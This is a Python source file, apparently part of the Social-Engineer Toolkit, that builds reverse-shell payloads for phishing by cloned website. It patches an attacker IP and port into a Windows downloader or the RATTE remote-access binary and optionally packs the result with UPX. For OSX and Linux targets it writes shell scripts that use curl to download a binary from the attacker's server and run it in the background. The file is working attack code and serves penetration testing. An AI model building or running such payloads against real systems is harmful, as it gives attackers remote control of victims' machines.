#!/usr/bin/python
############################################
#
# Code behind the SET interactive shell
# and RATTE
#
############################################
import os
import sys
import subprocess
import re
from src.core import setcore

definepath = os.getcwd()
sys.path.append(definepath)

definepath = os.getcwd()

# check the config file
fileopen = file("config/set_config", "r")
for line in fileopen:
        line = line.rstrip()
        # define if we use upx encoding or not
        match = re.search("UPX_ENCODE=", line)
        if match:
                upx_encode = line.replace("UPX_ENCODE=", "")
        # set the upx flag
        match1 = re.search("UPX_PATH=", line)
        if match1:
                upx_path = line.replace("UPX_PATH=", "")
                if upx_encode == "ON":
                        if not os.path.isfile(upx_path):
                                setcore.PrintWarning("UPX packer not found in the pathname specified in config. Disabling UPX packing for executable")
                                upx_encode == "OFF"
        # if we removed the set shells to free up space, needed for pwniexpress
        match2= re.search("SET_INTERACTIVE_SHELL=", line)
        if match2:
                line = line.replace("SET_INTERACTIVE_SHELL=", "").lower()
                if line == "off":
                        sys.exit("\n   [-] SET Interactive Mode is set to DISABLED. Please change it in the SET config")
                        

# make directory if it's not there
if not os.path.isfile("src/program_junk/web_clone/"):
        subprocess.Popen("mkdir src/program_junk/web_clone/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

# grab ip address and SET web server interface
if os.path.isfile("src/program_junk/interface"):
        fileopen = file("src/program_junk/interface", "r")
        for line in fileopen:
                ipaddr = line.rstrip()
        if os.path.isfile("src/program_junk/ipaddr.file"):
                        fileopen = file ("src/program_junk/ipaddr.file", "r")
                        for line in fileopen:
                                webserver = line.rstrip()

        if not os.path.isfile("src/program_junk/ipaddr.file"):
                ipaddr = raw_input(setcore.setprompt("0", "IP address to connect back on for the reverse listener"))

else:
        if os.path.isfile("src/program_junk/ipaddr.file"):
                fileopen = file("src/program_junk/ipaddr.file", "r")
                for line in fileopen:
                        ipaddr = line.rstrip()
                webserver = ipaddr

# grab port options from payloadgen.py
if os.path.isfile("src/program_junk/port.options"):
        fileopen = file("src/program_junk/port.options", "r")
        for line in fileopen: 
                port = line.rstrip()
else:
        port = raw_input(setcore.setprompt("0", "Port you want to use for the connection back"))


# define the main variables here

# generate a random executable name per instance
exe_name = setcore.generate_random_string(10,10) + ".exe"

webserver = webserver + " " + port

webserver = exe_name + " " + webserver

# this is generated through payloadgen.py and lets SET know if its a RATTE payload or SET payload
if os.path.isfile("src/program_junk/set.payload"):
        fileopen = file("src/program_junk/set.payload", "r")
        for line in fileopen:
                payload_selection = line.rstrip()
else:
        payload_selection = "SETSHELL"


# determine if we want to target osx/nix as well
posix = False
# find if we selected it
if os.path.isfile("%s/src/program_junk/set.payload.posix" % (definepath)):
        # if we have then claim true
        posix = True
        # once we have flag, no longer needed
        #os.remove("%s/src/program_junk/set.payload.posix" % (definepath))

# if we selected the SET Interactive shell in payloadgen
if payload_selection == "SETSHELL":
        # replace ipaddress with one that we need for reverse connection back
        fileopen = open("src/payloads/set_payloads/downloader.windows" , "rb")
        data = fileopen.read()
        filewrite = open("src/program_junk/msf.exe" , "wb")
        host = int(len(exe_name)+1) * "X"
        webserver_count = int(len(webserver)+1) * "S"
        ipaddr_count = int(len(ipaddr)+1) * "M"
        filewrite.write(data.replace(str(host), exe_name+"\x00", 1))
        filewrite.close()
        fileopen = open("src/program_junk/msf.exe" , "rb")
        data = fileopen.read()
        filewrite = open("src/program_junk/msf.exe" , "wb")
        filewrite.write(data.replace(str(webserver_count), webserver+"\x00", 1))
        filewrite.close()
        fileopen = open("src/program_junk/msf.exe" , "rb")
        data = fileopen.read()
        filewrite = open("src/program_junk/msf.exe" , "wb")
        filewrite.write(data.replace(str(ipaddr_count), ipaddr+"\x00", 1))
        filewrite.close()

# if we selected RATTE in our payload selection
if payload_selection == "RATTE":
        fileopen = file("src/payloads/ratte/ratte.binary", "rb")
        data = fileopen.read()
        filewrite = open("src/program_junk/msf.exe", "wb")
        host = int(len(ipaddr)+1) * "X"
        rPort = int(len(str(port))+1) * "Y"
        filewrite.write(data.replace(str(host), ipaddr+"\x00", 1))
        filewrite.close()
        fileopen = open("src/program_junk/msf.exe", "rb")
        data = fileopen.read()
        filewrite = open("src/program_junk/msf.exe", "wb")
        filewrite.write(data.replace(str(rPort), str(port)+"\x00", 1))
        filewrite.close()

setcore.PrintStatus("Done, moving the payload into the action.")

if upx_encode == "ON" or upx_encode == "on":
                # core upx
                setcore.upx("src/program_junk/msf.exe")

subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/web_clone/msf.exe", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
if payload_selection == "SETSHELL":
        subprocess.Popen("cp src/payloads/set_payloads/shell.windows src/program_junk/web_clone/x", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

# if we are targetting nix
if posix == True:
        setcore.PrintInfo("Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
        filewrite = file("%s/src/program_junk/web_clone/mac.bin" % (definepath), "w")
        payload_flags = webserver.split(" ")
        # grab osx binary name
        osx_name = setcore.generate_random_string(10,10)
        downloader = "#!/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],osx_name,osx_name,osx_name,payload_flags[1],payload_flags[2])
        filewrite.write(downloader)
        filewrite.close()
        # grab nix binary name
        linux_name = setcore.generate_random_string(10,10)
        downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],linux_name,linux_name,linux_name,payload_flags[1],payload_flags[2])
        filewrite = file("%s/src/program_junk/web_clone/nix.bin" % (definepath), "w")
        filewrite.write(downloader)
        filewrite.close()
        subprocess.Popen("cp %s/src/payloads/set_payloads/shell.osx %s/src/program_junk/web_clone/%s" % (definepath,definepath,osx_name), shell=True).wait()
        subprocess.Popen("cp %s/src/payloads/set_payloads/shell.linux %s/src/program_junk/web_clone/%s" % (definepath,definepath,linux_name), shell=True).wait()
